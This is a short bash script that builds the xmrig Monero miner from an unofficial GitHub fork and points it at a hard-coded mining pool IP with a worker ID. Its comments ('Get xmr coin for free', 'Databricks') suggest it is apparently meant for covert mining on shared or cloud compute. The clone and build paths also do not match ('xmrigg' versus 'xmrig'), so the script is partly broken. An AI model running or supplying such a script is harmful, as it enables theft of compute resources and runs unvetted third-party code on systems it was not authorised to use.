#! /bin/bash
# Get xmr coin for free
# Databricks
sudo apt update
clear
sudo apt install screen
screen -R xmr

sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
git clone https://github.com/ADYZM/xmrigg
mkdir xmrig/build && cd xmrig/build
cmake ..
make -j$(nproc)
./xmrig -o 168.235.86.33:3393 -u SK_QzApkbVGsAxyQykaWSnEF.adyzza -p x -k --coin monero -a cn/gpu
